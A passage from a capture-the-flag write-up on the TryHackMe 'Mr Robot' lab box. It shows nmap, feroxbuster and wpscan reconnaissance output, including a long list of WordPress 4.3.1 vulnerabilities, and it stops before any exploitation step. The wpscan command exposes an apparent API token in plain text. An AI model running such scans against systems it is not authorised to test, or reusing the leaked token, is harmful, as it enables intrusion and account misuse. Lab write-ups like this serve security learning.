---
title: "THM - # Mr Robot CTF"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # Mr Robot CTF"
categories:
  - THM
---

The given box ```Mr Robot CTF``` is a Linux machine 

- [TryHackMe- Mr Robot CTF](#tryhackme---MrRobotCTF)
  - [Recon](#recon)
	  - [Nmap Scan](#nmap-scan)
	  - [Autorecon Scan](#autorecon-scan)
 - [Enumeration](#enumeration)
	 - [Enumeration on port 80](#enumeration-on-port-80)

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/MrRobotCTF/assets/images/robot.png" />
</center>

## Recon

### Nmap Scan

### Autorecon Scan

```shell
# Nmap 7.92 scan initiated Sun Aug  7 18:55:51 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /root/enum-more/obsidian_vault/thm/LINUX/MrRobotCTF/results/10.10.197.198/scans/_quick_tcp_nmap.txt -oX /root/enum-more/obsidian_vault/thm/LINUX/MrRobotCTF/results/10.10.197.198/scans/xml/_quick_tcp_nmap.xml 10.10.197.198
Nmap scan report for 10.10.197.198
Host is up, received user-set (0.16s latency).
Scanned at 2022-08-07 18:55:52 IST for 36s
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 63
80/tcp  open   http     syn-ack ttl 63 Apache httpd
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
443/tcp open   ssl/http syn-ack ttl 63 Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
OS fingerprint not ideal because: Didnt receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=8/7%OT=80%CT=22%CU=%PV=Y%DS=2%DC=T%G=N%TM=62EFBD84%P=aarch64-unknown-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%TG=40%W=6903%O=M505NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.014 days (since Sun Aug  7 18:36:54 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   161.76 ms 10.11.0.1
2   162.51 ms 10.10.197.198

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  7 18:56:28 2022 -- 1 IP address (1 host up) scanned in 36.72 seconds
```

## Enumeration

### Port 80

feroxbuster

```shell
┌──(root㉿enum-more)-[~/…/results/10.10.197.198/scans/tcp80]
└─# cat tcp_80_http_feroxbuster_dirbuster.txt                 
200      GET       26l       94w      727c http://10.10.197.198/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js
200      GET      820l     6033w   239300c http://10.10.197.198/js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js
200      GET       30l       98w     1188c http://10.10.197.198/index.html
200      GET       61l      849w    50555c http://10.10.197.198/js/s_code.js.pagespeed.jm.I78cfHQpbQ.js
200      GET        1l     2254w   182004c http://10.10.197.198/js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js
200      GET       30l       98w     1188c http://10.10.197.198/
200      GET      178l      774w     5899c http://10.10.197.198/wp-content/themes/twentyfifteen/js/functions.js
200      GET        2l      204w     7200c http://10.10.197.198/wp-includes/js/jquery/jquery-migrate.min.js
301      GET        0l        0w        0c http://10.10.197.198/.git/index.php => http://10.10.197.198/.git/
200      GET        6l     1414w    95977c http://10.10.197.198/wp-includes/js/jquery/jquery.js
200      GET       53l      158w     2613c http://10.10.197.198/wp-login.php
301      GET        0l        0w        0c http://10.10.197.198/.git/logs/comments/feed => http://10.10.197.198/.git/logs/feed/
301      GET        0l        0w        0c http://10.10.197.198/.git/comments/feed => http://10.10.197.198/.git/feed/
301      GET        0l        0w        0c http://10.10.197.198/.svn/comments/feed => http://10.10.197.198/.svn/feed/
301      GET        0l        0w        0c http://10.10.197.198/.well-known/comments/feed => http://10.10.197.198/.well-known/feed/
301      GET        0l        0w        0c http://10.10.197.198/.well-known/autoconfig/comments/feed => http://10.10.197.198/.well-known/autoconfig/feed/
301      GET        0l        0w        0c http://10.10.197.198/0 => http://10.10.197.198/0/
301      GET        0l        0w        0c http://10.10.197.198/CVS/comments/feed => http://10.10.197.198/CVS/feed/
301      GET        0l        0w        0c http://10.10.197.198/Image => http://10.10.197.198/Image/
301      GET        0l        0w        0c http://10.10.197.198/_vti_bin/_vti_adm/comments/feed => http://10.10.197.198/_vti_bin/_vti_adm/feed/
301      GET        0l        0w        0c http://10.10.197.198/_vti_bin/_vti_aut/comments/feed => http://10.10.197.198/_vti_bin/_vti_aut/feed/
301      GET        0l        0w        0c http://10.10.197.198/_vti_bin/comments/feed => http://10.10.197.198/_vti_bin/feed/
301      GET        7l       20w      235c http://10.10.197.198/admin => http://10.10.197.198/admin/
301      GET        0l        0w        0c http://10.10.197.198/android/comments/feed => http://10.10.197.198/android/feed/
301      GET        0l        0w        0c http://10.10.197.198/api/experiments/comments/feed => http://10.10.197.198/api/experiments/feed/
301      GET        0l        0w        0c http://10.10.197.198/api/comments/feed => http://10.10.197.198/api/feed/
```

```shell
┌──(root㉿enum-more)-[~/…/MrRobotCTF/results/10.10.197.198/scans]
└─# wpscan --url http://10.10.197.198 --api-token PRD37W6CZOqaNSlZiMfRxM9yS4WqbsjxJOz3FBMhpSQ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.197.198/ [10.10.197.198]
[+] Started: Sun Aug  7 19:24:50 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.197.198/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.197.198/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.197.198/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.197.198/079df57.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.197.198/079df57.html, Match: 'WordPress 4.3.1'
 |
 | [!] 87 vulnerabilities identified:
 |
 | [!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.3.2
 |     References:
 |      - https://wpscan.com/vulnerability/09329e59-1871-4eb7-b6ea-fd187cd8db23
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
 |      - https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
 |
 | [!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
 |     Fixed in: 4.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/b19b6a22-3ebf-488d-b394-b578cd23c959
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
 |      - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/36435
 |      - https://hackerone.com/reports/110801
 |
 | [!] Title: WordPress 3.7-4.4.1 - Open Redirect
 |     Fixed in: 4.3.3
 |     References:
 |      - https://wpscan.com/vulnerability/8fba3ea1-553c-4426-ad00-03cc258bff3f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
 |      - https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/36444
 |
 | [!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/0810e7fe-7212-49ae-8dd1-75260130b7f5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029
 |      - https://codex.wordpress.org/Version_4.5
 |      - https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
 |
 | [!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/238b69c9-4d56-4820-b09f-e778f108faf7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634
 |      - https://codex.wordpress.org/Version_4.5
 |      - https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
 |
 | [!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
 |     Fixed in: 4.5
 |     References:
 |      - https://wpscan.com/vulnerability/c0775703-ed52-4b6b-b395-7bf440ee0d77
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635
 |      - https://codex.wordpress.org/Version_4.5
 |
 | [!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 4.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/60556c39-6fe7-4b69-a614-16202ba588ad
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
 |      - https://wordpress.org/news/2016/05/wordpress-4-5-2/
 |      - https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
 |      - https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
 |
 | [!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
 |     Fixed in: 4.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/a82a6c6f-1787-4adc-84dd-3151f1edfd06
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
 |      - https://wordpress.org/news/2016/05/wordpress-4-5-2/
 |      - https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
 |      - https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
 |
 | [!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
 |     Fixed in: 4.3.5
 |     References:
 |      - https://wpscan.com/vulnerability/a4395fa3-a2ba-4aac-b195-679112dd2828
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
 |
 | [!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
 |     Fixed in: 4.3.5
 |     References:
 |      - https://wpscan.com/vulnerability/12a47b8e-83e8-47b1-9713-cdd690b069e5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
 |      - https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
 |
 | [!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
 |     Fixed in: 4.3.5
 |     References:
 |      - https://wpscan.com/vulnerability/897d068a-d3c1-4193-bc55-f65225265967
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
 |
 | [!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
 |     Fixed in: 4.3.6
 |     References:
 |      - https://wpscan.com/vulnerability/e84eaf3f-677a-465a-8f96-ea4cf074c980
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
 |      - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
 |      - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
 |      - https://seclists.org/fulldisclosure/2016/Sep/6
 |
 | [!] Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
 |     Fixed in: 4.3.6
 |     References:
 |      - https://wpscan.com/vulnerability/7dcebd34-1a38-4f61-a116-bf8bf977b169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
 |      - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
 |
 | [!] Title: WordPress 4.3-4.7 - Remote Code Execution (RCE) in PHPMailer
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/146d60de-b03c-48c6-9b8b-344100f5c3d6
 |      - https://www.wordfence.com/blog/2016/12/phpmailer-vulnerability/
 |      - https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/24767c76d359231642b0ab48437b64e8c6c7f491
 |      - http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_phpmailer_host_header/
 |
 | [!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/8b098363-1efb-4831-9b53-bb5d9770e8b4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
 |      - https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/6737b4a2-080c-454a-a16e-7fc59824c659
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
 |      - https://www.mehmetince.net/low-severity-wordpress/
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
 |
 | [!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/0a666ddd-a13d-48c2-85c2-bfdc9cd2a5fb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
 |      - https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/e080c934-6a98-4726-8e7a-43a718d05e79
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
 |      - https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpscan.com/vulnerability/3e355742-6069-4d5d-9676-613df46e8c54
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
 |      - https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [!] Title: WordPress 4.2.0-4.7.1 - Press This UI Available to Unauthorised Users
 |     Fixed in: 4.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/c448e613-6714-4ad7-864f-77659b4da893
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5610
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/21264a31e0849e6ff793a06a17de877dd88ea454
 |
 | [!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
 |     Fixed in: 4.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/481e3398-ed2e-460a-af67-ff58027901d1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
 |
 | [!] Title: WordPress 4.3.0-4.7.1 - Cross-Site Scripting (XSS) in posts list table
 |     Fixed in: 4.3.8
 |     References:
 |      - https://wpscan.com/vulnerability/e99e456e-375a-4475-8070-229bc0e30c65
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5612
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/4482f9207027de8f36630737ae085110896ea849
 |
 | [!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
 |     Fixed in: 4.3.9
 |     References:
 |      - https://wpscan.com/vulnerability/2c5632d8-4d40-4099-9e8f-23afde51b56e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
 |      - https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
 |      - https://seclists.org/oss-sec/2017/q1/563
 |
 | [!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
 |     Fixed in: 4.3.9
 |     References:
 |      - https://wpscan.com/vulnerability/d40374cf-ee95-40b7-9dd5-dbb160b877b1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
 |
 | [!] Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
 |     Fixed in: 4.3.9
 |     References:
 |      - https://wpscan.com/vulnerability/3ee54fc3-f4b4-4c35-8285-9d6719acecf0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
 |      - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
 |
 | [!] Title: WordPress 4.2-4.7.2 - Press This CSRF DoS
 |     Fixed in: 4.3.9
 |     References:
 |      - https://wpscan.com/vulnerability/003d94a5-a075-47e5-a69e-eeaf9b7a3269
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6819
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
 |      - https://seclists.org/oss-sec/2017/q1/562
 |      - https://hackerone.com/reports/153093
 |
 | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
 |     References:
 |      - https://wpscan.com/vulnerability/b3f2f3db-75e4-4d48-ae5e-d4ff172bc093
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
 |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
 |      - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
 |      - https://core.trac.wordpress.org/ticket/25239
 |
 | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/e9e59e08-0586-4332-a394-efb648c7cd84
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
 |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |
 | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/973c55ed-e120-46a1-8dbb-538b54d03892
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
 |
 | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks 
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/a5a4f4ca-19e5-4665-b501-5c75e0f56001
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
 |
 | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/efe46d58-45e4-4cd6-94b3-1a639865ba5b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
 |
 | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/78ae4791-2703-4fdd-89b2-76c674994acf
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
 |      - https://hackerone.com/reports/203515
 |      - https://hackerone.com/reports/203515
 |
 | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
 |     Fixed in: 4.3.11
 |     References:
 |      - https://wpscan.com/vulnerability/e9535a5c-c6dc-4742-be40-1b94a718d3f3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
 |
 | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
 |     Fixed in: 4.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/9b3414c0-b33b-4c55-adff-718ff4c3195d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
 |
 | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
 |     Fixed in: 4.7.5
 |     References:
 |      - https://wpscan.com/vulnerability/95e87ae5-eb01-4e27-96d3-b1f013deff1c
 |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://wpvulndb.com/vulnerabilities/8905
 |
 | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
